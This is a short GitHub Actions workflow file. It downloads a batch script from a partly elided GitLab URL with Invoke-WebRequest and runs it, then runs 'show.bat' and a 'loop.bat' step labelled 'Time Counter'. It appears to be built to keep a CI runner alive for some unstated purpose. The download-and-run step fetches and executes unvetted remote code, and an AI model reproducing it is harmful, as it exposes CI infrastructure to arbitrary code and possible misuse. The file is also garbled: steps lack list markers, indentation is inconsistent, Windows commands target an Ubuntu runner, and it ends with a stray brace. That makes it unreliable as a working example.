 name: mehraz


on:
  workflow_dispatch:

jobs:
  build:
    name: Start Building...
    runs-on: ubuntu-latest

    
    steps:
name: Downloading & Installing Essentials
        run: |
          Invoke-WebRequest -Uri "https://gitlab.com/rap..." -OutFile "Downloads.bat"
          cmd /c Downloads.bat

name: Show Website
        run: cmd /c show.bat

name: Time Counter
        run: cmd /c loop.bat
}
